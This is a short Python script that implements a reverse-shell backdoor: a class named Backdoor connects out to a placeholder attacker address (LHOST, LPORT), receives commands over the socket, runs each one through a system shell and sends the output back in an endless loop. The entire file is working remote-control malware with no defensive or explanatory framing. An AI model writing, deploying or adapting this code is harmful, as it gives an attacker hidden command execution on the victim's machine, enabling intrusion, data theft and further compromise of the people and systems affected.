#!/usr/bin/env python
import socket
import subprocess

class Backdoor:
	def __init__(self,ip,port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def execute_system_command(self,command):

		return subprocess.check_output(command, shell=True)

	def run(self):
		while True:
			command = self.connection.recv(1024)
			cmd_result = self.execute_system_command(command.decode('utf-8'))
			# in python3 as the data coming from listener is in bytes you'll have to decode it in the string
			self.connection.sendall(cmd_result)
		self.connection.close()

rev = Backdoor("LHOST",LPORT)
rev.run()